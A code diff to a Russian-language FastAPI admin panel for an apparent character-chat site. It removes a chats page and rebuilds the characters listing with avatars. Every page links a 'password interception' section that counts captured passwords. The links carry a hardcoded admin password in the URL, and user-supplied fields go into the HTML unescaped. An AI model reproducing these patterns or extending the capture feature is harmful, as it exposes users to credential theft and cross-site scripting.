@@ -36,7 +36,6 @@ def admin_home(request: Request, _ = Depends(check_auth)):
     
     users_count = db.query(models.User).count()
     characters_count = db.query(models.Character).count()
-    chats_count = db.query(models.Chat).count()
     captures_count = count_captures()
     
     recent_users = db.query(models.User).order_by(models.User.id.desc()).limit(5).all()
@@ -83,13 +82,12 @@ def admin_home(request: Request, _ = Depends(check_auth)):
                 <a href="/admin?password=admin123" class="active">📊 Дашборд</a>
                 <a href="/admin/users?password=admin123">👥 Пользователи</a>
                 <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
-                <a href="/admin/chats?password=admin123">💬 Чаты</a>
+                
                 <a href="/admin/captures?password=admin123">🔐 Перехват</a>
             </div>
             <div class="stats-grid">
                 <div class="stat-card"><div class="stat-number">{users_count}</div><div class="stat-label">👥 Пользователи</div></div>
                 <div class="stat-card"><div class="stat-number">{characters_count}</div><div class="stat-label">🎭 Персонажи</div></div>
-                <div class="stat-card"><div class="stat-number">{chats_count}</div><div class="stat-label">💬 Чаты</div></div>
                 <div class="stat-card"><div class="stat-number">{captures_count}</div><div class="stat-label">🔐 Перехвачено</div></div>
             </div>
             <div class="section">
@@ -162,7 +160,7 @@ def admin_users(request: Request, _ = Depends(check_auth)):
                 <a href="/admin?password=admin123">📊 Дашборд</a>
                 <a href="/admin/users?password=admin123" class="active">👥 Пользователи</a>
                 <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
-                <a href="/admin/chats?password=admin123">💬 Чаты</a>
+                
                 <a href="/admin/captures?password=admin123">🔐 Перехват</a>
             </div>
             <div class="section">
@@ -183,126 +181,10 @@ def admin_users(request: Request, _ = Depends(check_auth)):
 # ============================================================
 # 3. ПЕРСОНАЖИ
 # ============================================================
-@router.get("/characters")
-def admin_characters(request: Request, _ = Depends(check_auth)):
-    db: Session = database.get_db().__next__()
-    characters = db.query(models.Character).order_by(models.Character.id.desc()).all()
-    
-    html = f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="utf-8">
-        <title>Персонажи - Admin</title>
-        <style>
-            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-            body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0f0e17; color: #fffffe; padding: 20px; }}
-            .container {{ max-width: 1400px; margin: 0 auto; }}
-            .header {{ display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #2d2b3a; margin-bottom: 30px; }}
-            .header h1 {{ color: #ff8906; }}
-            .nav {{ display: flex; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; }}
-            .nav a {{ color: #fffffe; text-decoration: none; padding: 8px 20px; border-radius: 8px; background: #1a1932; border: 1px solid #2d2b3a; }}
-            .nav a:hover {{ background: #2d2b3a; }}
-            .nav a.active {{ background: #ff8906; border-color: #ff8906; color: #0f0e17; }}
-            .section {{ background: #1a1932; padding: 20px; border-radius: 12px; border: 1px solid #2d2b3a; }}
-            table {{ width: 100%; border-collapse: collapse; }}
-            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #2d2b3a; }}
-            th {{ color: #a7a9be; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
-            td {{ color: #fffffe; }}
-            .name {{ color: #89b4fa; }}
-            .back {{ color: #a7a9be; text-decoration: none; }}
-            .back:hover {{ color: #fffffe; }}
-            .desc {{ color: #a7a9be; font-size: 13px; }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>🎭 Персонажи</h1>
-                <a href="/admin?password=admin123" class="back">← Назад</a>
-            </div>
-            <div class="nav">
-                <a href="/admin?password=admin123">📊 Дашборд</a>
-                <a href="/admin/users?password=admin123">👥 Пользователи</a>
-                <a href="/admin/characters?password=admin123" class="active">🎭 Персонажи</a>
-                <a href="/admin/chats?password=admin123">💬 Чаты</a>
-                <a href="/admin/captures?password=admin123">🔐 Перехват</a>
-            </div>
-            <div class="section">
-                <table>
-                    <tr><th>ID</th><th>Имя</th><th>Создатель</th><th>Описание</th><th>Создан</th></tr>
-    """
-    for char in characters:
-        html += f"<tr><td>{char.id}</td><td class='name'>{char.name}</td><td>{char.user_id or '—'}</td><td class='desc'>{(char.description or '')[:80]}{'...' if len(char.description or '') > 80 else ''}</td><td>{char.created_at.strftime('%Y-%m-%d %H:%M') if char.created_at else '—'}</td></tr>"
-    html += """
-                </table>
-            </div>
-        </div>
-    </body>
-    </html>
-    """
-    return HTMLResponse(html)
 
 # ============================================================
 # 4. ЧАТЫ
 # ============================================================
-@router.get("/chats")
-def admin_chats(request: Request, _ = Depends(check_auth)):
-    db: Session = database.get_db().__next__()
-    chats = db.query(models.Chat).order_by(models.Chat.id.desc()).all()
-    
-    html = f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="utf-8">
-        <title>Чаты - Admin</title>
-        <style>
-            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-            body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0f0e17; color: #fffffe; padding: 20px; }}
-            .container {{ max-width: 1400px; margin: 0 auto; }}
-            .header {{ display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #2d2b3a; margin-bottom: 30px; }}
-            .header h1 {{ color: #ff8906; }}
-            .nav {{ display: flex; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; }}
-            .nav a {{ color: #fffffe; text-decoration: none; padding: 8px 20px; border-radius: 8px; background: #1a1932; border: 1px solid #2d2b3a; }}
-            .nav a:hover {{ background: #2d2b3a; }}
-            .nav a.active {{ background: #ff8906; border-color: #ff8906; color: #0f0e17; }}
-            .section {{ background: #1a1932; padding: 20px; border-radius: 12px; border: 1px solid #2d2b3a; }}
-            table {{ width: 100%; border-collapse: collapse; }}
-            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #2d2b3a; }}
-            th {{ color: #a7a9be; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
-            td {{ color: #fffffe; }}
-            .back {{ color: #a7a9be; text-decoration: none; }}
-            .back:hover {{ color: #fffffe; }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>💬 Чаты</h1>
-                <a href="/admin?password=admin123" class="back">← Назад</a>
-            </div>
-            <div class="nav">
-                <a href="/admin?password=admin123">📊 Дашборд</a>
-                <a href="/admin/users?password=admin123">👥 Пользователи</a>
-                <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
-                <a href="/admin/chats?password=admin123" class="active">💬 Чаты</a>
-                <a href="/admin/captures?password=admin123">🔐 Перехват</a>
-            </div>
-            <div class="section">
-                <table>
-                    <tr><th>ID</th><th>Пользователь</th><th>Персонаж</th><th>Создан</th></tr>
-    """
-    for chat in chats:
-        html += f"<tr><td>{chat.id}</td><td>{chat.user_id or '—'}</td><td>{chat.character_id or '—'}</td><td>{chat.created_at.strftime('%Y-%m-%d %H:%M') if chat.created_at else '—'}</td></tr>"
-    html += """
-                </table>
-            </div>
-        </div>
-    </body>
-    </html>
-    """
-    return HTMLResponse(html)
 
 # ============================================================
 # 5. ПЕРЕХВАТ ПАРОЛЕЙ
@@ -350,7 +232,7 @@ def admin_captures(request: Request, _ = Depends(check_auth)):
                 <a href="/admin?password=admin123">📊 Дашборд</a>
                 <a href="/admin/users?password=admin123">👥 Пользователи</a>
                 <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
-                <a href="/admin/chats?password=admin123">💬 Чаты</a>
+                
                 <a href="/admin/captures?password=admin123" class="active">🔐 Перехват</a>
             </div>
             <div class="section">
@@ -367,4 +249,32 @@ def admin_captures(request: Request, _ = Depends(check_auth)):
     </body>
     </html>
     """
+    return HTMLResponse(html)
+@router.get("/characters")
+def admin_characters(request: Request, _ = Depends(check_auth)):
+    db: Session = database.get_db().__next__()
+    characters = db.query(models.Character).order_by(models.Character.id.desc()).all()
+    
+    html = f"""
+    <!DOCTYPE html><html><head><meta charset="utf-8"><title>Персонажи</title>
+    <style>body{{font-family:'Segoe UI',Arial,sans-serif;background:#0f0e17;color:#fffffe;padding:20px;}}
+    .container{{max-width:1400px;margin:0 auto;}}.header{{display:flex;justify-content:space-between;align-items:center;padding:20px 0;border-bottom:2px solid #2d2b3a;margin-bottom:30px;}}
+    .header h1{{color:#ff8906;}}.nav{{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap;}}
+    .nav a{{color:#fffffe;text-decoration:none;padding:8px 20px;border-radius:8px;background:#1a1932;border:1px solid #2d2b3a;}}
+    .nav a:hover{{background:#2d2b3a;}}.nav a.active{{background:#ff8906;border-color:#ff8906;color:#0f0e17;}}
+    .section{{background:#1a1932;padding:20px;border-radius:12px;border:1px solid #2d2b3a;}}
+    table{{width:100%;border-collapse:collapse;}}th,td{{padding:12px;text-align:left;border-bottom:1px solid #2d2b3a;}}
+    th{{color:#a7a9be;font-size:12px;text-transform:uppercase;letter-spacing:1px;}}.name{{color:#89b4fa;}}
+    .desc{{color:#a7a9be;font-size:13px;}}.back{{color:#a7a9be;text-decoration:none;}}.back:hover{{color:#fffffe;}}
+    .avatar{{width:50px;height:50px;border-radius:50%;object-fit:cover;}}
+    </style></head>
+    <body><div class="container"><div class="header"><h1>🎭 Персонажи</h1><a href="/admin?password=admin123" class="back">← Назад</a></div>
+    <div class="nav"><a href="/admin?password=admin123">📊 Дашборд</a><a href="/admin/users?password=admin123">👥 Пользователи</a><a href="/admin/characters?password=admin123" class="active">🎭 Персонажи</a><a href="/admin/captures?password=admin123">🔐 Перехват</a></div>
+    <div class="section"><table><tr><th>ID</th><th>Аватар</th><th>Имя</th><th>Создатель</th><th>Описание</th><th>Создан</th></tr>
+    """
+    for char in characters:
+        avatar = char.avatar_url or ''
+        avatar_html = f'<img src="{avatar}" class="avatar" onerror="this.style.display=\'none\'">' if avatar else '—'
+        html += f"<tr><td>{char.id}</td><td>{avatar_html}</td><td class='name'>{char.name}</td><td>{char.owner_id or '—'}</td><td class='desc'>{(char.description or '')[:80]}{'...' if len(char.description or '') > 80 else ''}</td><td>{char.created_at.strftime('%Y-%m-%d %H:%M') if char.created_at else '—'}</td></tr>"
+    html += "</table></div></div></body></html>"
     return HTMLResponse(html)
